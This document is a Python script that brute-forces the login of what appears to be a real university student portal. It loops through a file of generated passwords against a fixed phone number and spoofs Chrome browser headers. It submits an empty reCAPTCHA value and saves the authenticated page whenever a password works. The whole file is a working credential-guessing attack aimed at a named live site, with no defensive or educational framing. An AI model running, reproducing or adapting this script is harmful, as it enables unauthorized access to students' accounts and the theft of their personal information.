import requests
from datetime import datetime

def get_passwords(filename="generated_passwords.txt"):
    """Read passwords from a file, strip whitespace."""
    with open(filename, 'r', encoding='utf-8') as f:
        return [line.strip() for line in f if line.strip()]

def get_headers():
    return {
        'authority': 'apps.dpu.edu.krd',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,ar-IQ;q=0.8,ar;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://apps.dpu.edu.krd',
        'pragma': 'no-cache',
        'referer': 'https://apps.dpu.edu.krd/student_portal/',
        'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'
    }

def attempt_login(phone_no, password):
    """Send POST and return True if login appears successful."""
    url = "https://apps.dpu.edu.krd/student_portal/"
    payload = {
        'phone_no': phone_no,
        'password': password,
        'g-recaptcha-response': '',
        'submit': '',
        'token': ''
    }
    response = requests.post(url, data=payload, headers=get_headers())
    # return tuple(success_flag, response_text)
    return ("DPU Student Portal - Login" not in response.text, response.text)

def main():
    phone_no = "0750000000"  # fixed phone number
    passwords = get_passwords("generated_passwords.txt")

    for pwd in passwords:
        success, html = attempt_login(phone_no, pwd)
        if success:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{phone_no}_{pwd}_{timestamp}.html"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(html)
            print(f"[+] Success with password `{pwd}` – saved to `{filename}`")
        else:
            print(f"[-] Failed with password `{pwd}`")

if __name__ == "__main__":
    main()
